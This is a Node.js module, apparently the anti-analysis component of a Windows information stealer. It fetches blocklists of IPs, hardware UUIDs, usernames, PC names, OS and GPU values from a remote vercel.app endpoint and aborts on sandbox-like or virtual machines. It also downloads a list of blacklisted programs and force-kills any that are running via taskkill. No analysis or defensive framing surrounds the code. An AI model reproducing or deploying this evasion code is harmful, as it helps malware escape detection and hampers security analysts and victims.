let util = require("util"),
  process = require("process"),
  child_process = require("child_process"),
  fetch = (...a) => import('node-fetch').then(({ default: fetch }) => fetch(...a)),
  exec = util.promisify(child_process.exec);

const request = async (u) => {
  try {
    let r = await fetch(u); 
    return r.json();
  } catch (e) {
    console.error(e);
    return {};
  }
};

const killer = async (u, c) => {
  try {
    let d = await request(u),
      {
        stdout
      } = await exec(c),
      s = stdout.split(/\r?\n/),
      b = d.blacklistedprog;
    for (let p of s) {
      let n = p.split(/\s+/)[0].replace(".exe", "");
      if (!n.toLowerCase() === "cmd" && b.includes(n)) {
        try {
          await exec(`taskkill /F /IM ${n}.exe`);
        } catch (err) {
          return ""
        }
      }
    }
  } catch (e) {
    console.error(e);
  }
};

const isBlocked = async (u, v) => {
  try {
    const d = await request(u);
    return d.includes(v);
  } catch (e) {
    console.error(e);
    return false;
  }
};

const killBlacklist = async () => await killer("https://6889-fun.vercel.app/api/aurathemes/bypass/blacklist/progr?aurathemes=true", "tasklist");

const checkBlocked = async (u, v) => await isBlocked(`https://6889-fun.vercel.app/api/aurathemes/bypass/blocked/${u}?aurathemes=true`, v);

const gpuBlocked = async (u) => await checkBlocked("gpus", u);

const osBlocked = async (q) => await checkBlocked("oss", q);

const nameBlocked = async (r) => await checkBlocked("pcnames", r);

const usernameBlocked = async (f) => await checkBlocked("progr", f);

const uuidBlocked = async (a) => await checkBlocked("uuids", a);

const ipBlocked = async (s) => await checkBlocked("ips", s);

const antidebug = async (a, d, r, i, c, l, q, ñ, s, w, z) => {
  if (a === false) return;
  try {
    const [p, u] = [process.env.COMPUTERNAME || "Not found", process.env.USERNAME || "Not found"];
    const [g, h, j, k, f, m] = await Promise.all([ipBlocked(l), uuidBlocked(i), usernameBlocked(u), nameBlocked(p), osBlocked(q), gpuBlocked(s)]);
    if ((!isNaN(d) && d < 80 && !isNaN(r) && r < 2) || (!isNaN(c) && c < 2) || g || h || j || k || f || m) process.abort() && process.exit(1);
    try {
      await killBlacklist();
    } catch (e) {
      console.error(e);
    }
  } catch (e) {
    console.error(e);
  }
};

module.exports = {
  antidebug
};
